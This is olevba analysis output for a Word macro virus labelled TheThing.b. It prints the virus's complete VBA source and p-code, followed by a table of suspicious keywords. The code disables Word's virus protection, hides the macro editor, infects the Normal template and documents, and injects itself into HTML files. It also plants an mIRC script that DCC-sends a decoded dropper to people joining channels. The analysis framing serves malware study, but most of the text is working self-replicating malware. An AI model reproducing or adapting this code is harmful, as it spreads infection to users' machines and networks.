olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.TheThing.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.TheThing.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.TheThing.b - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
 On Error Resume Next
 'TheThing
 'by CyberShadow//SMF
 Call DisableAll
 Call infectDoc
 Call infectMIRC
 Call WriteDump("c:\"): ' rv = Shell("c:\thething.com", 6)
 Kill "c:\thething.com"
 Call infectHTMS
 Application.ScreenUpdating = True
End Sub
Private Sub infectHTMS()
 On Error Resume Next
 a = System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Personal")
 Call SearchForHTM(a)
 a = Environ("PATH")
 i = 1
 Do While i <= Len(a)
  c = ""
  Do While i <= Len(a) And Mid$(a, i, 1) <> ";"
   c = c + Mid$(a, i, 1)
   i = i + 1
  Loop
  Call SearchForHTM(c)
  i = i + 1
 Loop
End Sub
Private Sub ViewVBCode(): Stealth: End Sub
Private Sub ToolsMacro(): Stealth: End Sub
Private Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth(): On Error Resume Next
    ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub
Private Sub SearchForHTM(PathForHTM)
 On Error Resume Next
 Target = Dir$(PathForHTM + "\*.htm*")
 If Target = "" Then GoTo NoHTMs
 Do
  Open PathForHTM + "\" + Target For Input As #1
  Line Input #1, a
  If a <> "<html> <CyberShadow>" Then
   c = a
   Do While Not EOF(1)
    Input #1, a
    c = c + Chr$(13) + Chr$(10) + a
   Loop
  Close #1
  Open PathForHTM + "\" + Target For Output As #1
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   For i = 1 To AD.countoflines
    ca = AD.lines(i, 1)
    If i < 30 Then ca = Mid$(ca, 2, Len(ca) - 1)
    If i >= 30 And i < AD.countoflines - 2 Then ca = "'" + ca
    If ca <> "" Then Print #1, ca
   Next
  Print #1, c
  End If
  Close #1
  Target = Dir$
 Loop While Target <> ""
NoHTMs:
End Sub
Private Sub infectMIRC()
 For i = 0 To 5
  a = Chr$(Asc("C") + i)
  Call infect(a)
 Next
End Sub
Private Sub infect(a)
 On Error GoTo outta
 a1 = a + ":\mirc\"
 Open a1 + "script.ini" For Output As #1
  Print #1, "[script]"
  Print #1, "n0=on 1:JOIN:#:/dcc send $nick " + a1 + "thething.com"
 Close #1
 dropperPath = a1
 Call WriteDump(dropperPath)
outta:
End Sub
Private Sub DisableAll()
 On Error Resume Next
 SetAttr NormalTemplate.Path + "\" + NormalTemplate, 0
 With Application
  .EnableCancelKey = True
  .ScreenUpdating = False
  .ShowVisualBasicEditor = False
 End With
 With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
 End With
End Sub
Private Sub infectDoc()
 On Error Resume Next
 Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 If NT.lines(1, 1) <> "'<html> <CyberShadow>" Then
   NT.DeleteLines 1, NT.countoflines
   NT.Insertlines 1, AD.lines(1, AD.countoflines)
 End If
 If AD.lines(1, 1) <> "'<html> <CyberShadow>" Then
   AD.DeleteLines 1, AD.countoflines
   AD.Insertlines 1, NT.lines(1, NT.countoflines)
 End If
 i = 1: c = AD.countofline
 Do While i <= c
  If AD.lines(i, 1) = "</HTML" + ">" Then
   AD.DeleteLines i + 1, AD.countoflines - i - 1
   i = c
  End If
  i = i + 1
 Loop
 i = 1: c = NT.countoflines
 Do While i <= c
  If NT.lines(i, 1) = "</HTML" + ">" Then
   NT.DeleteLines i + 1, NT.countoflines - i - 1
   i = c
  End If
  i = i + 1
 Loop
End Sub
Private Sub WriteDump(dropperPath)
 On Error Resume Next
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 checkit = "Dumpin"
 i = 1: GetDump = 0
 Do While i < AD.countoflines
  a = AD.lines(i, 1)
  If Len(a) > Len(checkit) Then
   For j = 1 To Len(a) - Len(checkit)
    If Mid$(a, j, Len(checkit) + 1) = checkit + "g" Then GetDump = i + 1: i = AD.countoflines
   Next
  End If
  i = i + 1
 Loop
 dropperBody = ""
 Do While Mid$(AD.lines(GetDump, 1), 1, 1) = "'"
  If Len(AD.lines(GetDump, 1)) > 2 Then
   For i = 2 To Len(AD.lines(GetDump, 1)) Step 2
    If Mid$(AD.lines(GetDump, 1), i, 1) <> " " Then
     a1 = Asc(Mid$(AD.lines(GetDump, 1), i, 1)) - 33
     b1 = Asc(Mid$(AD.lines(GetDump, 1), i + 1, 1)) - 33
     dropperBody = dropperBody + Chr$(a1 + 16 * b1)
    End If
   Next
  End If
  GetDump = GetDump + 1
 Loop
 Open dropperPath + "thething.com" For Output As #1
  Print #1, dropperBody;
 Close #1
End Sub
Private Sub Dumping()

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.TheThing.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Module1 - 8701 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	QuoteRem 0x0001 0x0008 "TheThing"
' Line #3:
' 	QuoteRem 0x0001 0x0013 "by CyberShadow//SMF"
' Line #4:
' 	ArgsCall (Call) DisableAll 0x0000 
' Line #5:
' 	ArgsCall (Call) infectDoc 0x0000 
' Line #6:
' 	ArgsCall (Call) infectMIRC 0x0000 
' Line #7:
' 	LitStr 0x0003 "c:\"
' 	ArgsCall (Call) WriteDump 0x0001 
' 	BoS 0x0000 
' 	QuoteRem 0x0017 0x0021 " rv = Shell("c:\thething.com", 6)"
' Line #8:
' 	LitStr 0x000F "c:\thething.com"
' 	ArgsCall Kill 0x0001 
' Line #9:
' 	ArgsCall (Call) infectHTMS 0x0000 
' Line #10:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Sub infectHTMS())
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	LitStr 0x0000 ""
' 	LitStr 0x0052 "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
' 	LitStr 0x0008 "Personal"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St a 
' Line #15:
' 	Ld a 
' 	ArgsCall (Call) SearchForHTM 0x0001 
' Line #16:
' 	LitStr 0x0004 "PATH"
' 	ArgsLd Environ 0x0001 
' 	St a 
' Line #17:
' 	LitDI2 0x0001 
' 	St i 
' Line #18:
' 	Ld i 
' 	Ld a 
' 	FnLen 
' 	Le 
' 	DoWhile 
' Line #19:
' 	LitStr 0x0000 ""
' 	St c 
' Line #20:
' 	Ld i 
' 	Ld a 
' 	FnLen 
' 	Le 
' 	Ld a 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 ";"
' 	Ne 
' 	And 
' 	DoWhile 
' Line #21:
' 	Ld c 
' 	Ld a 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St c 
' Line #22:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #23:
' 	Loop 
' Line #24:
' 	Ld c 
' 	ArgsCall (Call) SearchForHTM 0x0001 
' Line #25:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #26:
' 	Loop 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Private Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #29:
' 	FuncDefn (Private Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #30:
' 	FuncDefn (Private Sub FileTemplates())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #31:
' 	FuncDefn (Private Sub Stealth())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #32:
' 	LitDI2 0x0000 
' 	St ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Sub SearchForHTM(PathForHTM))
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	Ld PathForHTM 
' 	LitStr 0x0007 "\*.htm*"
' 	Add 
' 	ArgsLd Dir$ 0x0001 
' 	St Target 
' Line #37:
' 	Ld Target 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoHTMs 
' 	EndIf 
' Line #38:
' 	Do 
' Line #39:
' 	Ld PathForHTM 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld Target 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #40:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #41:
' 	Ld a 
' 	LitStr 0x0014 "<html> <CyberShadow>"
' 	Ne 
' 	IfBlock 
' Line #42:
' 	Ld a 
' 	St c 
' Line #43:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld a 
' 	InputItem 
' 	InputDone 
' Line #45:
' 	Ld c 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld a 
' 	Add 
' 	St c 
' Line #46:
' 	Loop 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #48:
' 	Ld PathForHTM 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld Target 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #49:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #50:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd countoflines 
' 	For 
' Line #51:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	St ca 
' Line #52:
' 	Ld i 
' 	LitDI2 0x001E 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld ca 
' 	LitDI2 0x0002 
' 	Ld ca 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St ca 
' 	EndIf 
' Line #53:
' 	Ld i 
' 	LitDI2 0x001E 
' 	Ge 
' 	Ld i 
' 	Ld AD 
' 	MemLd countoflines 
' 	LitDI2 0x0002 
' 	Sub 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "'"
' 	Ld ca 
' 	Add 
' 	St ca 
' 	EndIf 
' Line #54:
' 	Ld ca 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ca 
' 	PrintItemNL 
' 	EndIf 
' Line #55:
' 	StartForVariable 
' 	Next 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld c 
' 	PrintItemNL 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #59:
' 	Ld Dir$ 
' 	St Target 
' Line #60:
' 	Ld Target 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopWhile 
' Line #61:
' 	Label NoHTMs 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Private Sub infectMIRC())
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	For 
' Line #65:
' 	LitStr 0x0001 "C"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St a 
' Line #66:
' 	Ld a 
' 	ArgsCall (Call) infect 0x0001 
' Line #67:
' 	StartForVariable 
' 	Next 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Private Sub infect(a))
' Line #70:
' 	OnError outta 
' Line #71:
' 	Ld a 
' 	LitStr 0x0007 ":\mirc\"
' 	Add 
' 	St a1 
' Line #72:
' 	Ld a1 
' 	LitStr 0x000A "script.ini"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[script]"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "n0=on 1:JOIN:#:/dcc send $nick "
' 	Ld a1 
' 	Add 
' 	LitStr 0x000C "thething.com"
' 	Add 
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #76:
' 	Ld a1 
' 	St dropperPath 
' Line #77:
' 	Ld dropperPath 
' 	ArgsCall (Call) WriteDump 0x0001 
' Line #78:
' 	Label outta 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Private Sub DisableAll())
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #83:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #84:
' 	LitVarSpecial (True)
' 	MemStWith EnableCancelKey 
' Line #85:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #86:
' 	LitVarSpecial (False)
' 	MemStWith ShowVisualBasicEditor 
' Line #87:
' 	EndWith 
' Line #88:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #89:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #90:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #91:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #92:
' 	EndWith 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Private Sub infectDoc())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #97:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #98:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0015 "'<html> <CyberShadow>"
' 	Ne 
' 	IfBlock 
' Line #99:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd countoflines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #100:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd countoflines 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall Insertlines 0x0002 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0015 "'<html> <CyberShadow>"
' 	Ne 
' 	IfBlock 
' Line #103:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd countoflines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #104:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd countoflines 
' 	Ld NT 
' 	ArgsMemLd lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall Insertlines 0x0002 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	LitDI2 0x0001 
' 	St i 
' 	BoS 0x0000 
' 	Ld AD 
' 	MemLd countofline 
' 	St c 
' Line #107:
' 	Ld i 
' 	Ld c 
' 	Le 
' 	DoWhile 
' Line #108:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0006 "</HTML"
' 	LitStr 0x0001 ">"
' 	Add 
' 	Eq 
' 	IfBlock 
' Line #109:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld AD 
' 	MemLd countoflines 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #110:
' 	Ld c 
' 	St i 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #113:
' 	Loop 
' Line #114:
' 	LitDI2 0x0001 
' 	St i 
' 	BoS 0x0000 
' 	Ld NT 
' 	MemLd countoflines 
' 	St c 
' Line #115:
' 	Ld i 
' 	Ld c 
' 	Le 
' 	DoWhile 
' Line #116:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0006 "</HTML"
' 	LitStr 0x0001 ">"
' 	Add 
' 	Eq 
' 	IfBlock 
' Line #117:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld NT 
' 	MemLd countoflines 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #118:
' 	Ld c 
' 	St i 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #121:
' 	Loop 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Private Sub WriteDump(dropperPath))
' Line #124:
' 	OnError (Resume Next) 
' Line #125:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #126:
' 	LitStr 0x0006 "Dumpin"
' 	St checkit 
' Line #127:
' 	LitDI2 0x0001 
' 	St i 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St GetDump 
' Line #128:
' 	Ld i 
' 	Ld AD 
' 	MemLd countoflines 
' 	Lt 
' 	DoWhile 
' Line #129:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	St a 
' Line #130:
' 	Ld a 
' 	FnLen 
' 	Ld checkit 
' 	FnLen 
' 	Gt 
' 	IfBlock 
' Line #131:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	FnLen 
' 	Ld checkit 
' 	FnLen 
' 	Sub 
' 	For 
' Line #132:
' 	Ld a 
' 	Ld j 
' 	Ld checkit 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$$ 0x0003 
' 	Ld checkit 
' 	LitStr 0x0001 "g"
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St GetDump 
' 	BoS 0x0000 
' 	Ld AD 
' 	MemLd countoflines 
' 	St i 
' 	EndIf 
' Line #133:
' 	StartForVariable 
' 	Next 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #136:
' 	Loop 
' Line #137:
' 	LitStr 0x0000 ""
' 	St dropperBody 
' Line #138:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	DoWhile 
' Line #139:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Gt 
' 	IfBlock 
' Line #140:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #141:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 " "
' 	Ne 
' 	IfBlock 
' Line #142:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0021 
' 	Sub 
' 	St a1 
' Line #143:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0021 
' 	Sub 
' 	St b1 
' Line #144:
' 	Ld dropperBody 
' 	Ld a1 
' 	LitDI2 0x0010 
' 	Ld b1 
' 	Mul 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St dropperBody 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	StartForVariable 
' 	Next 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Add 
' 	St GetDump 
' Line #149:
' 	Loop 
' Line #150:
' 	Ld dropperPath 
' 	LitStr 0x000C "thething.com"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld dropperBody 
' 	PrintItemSemi 
' 	PrintEoS 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Private Sub Dumping())
' Line #155:
' Line #156:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

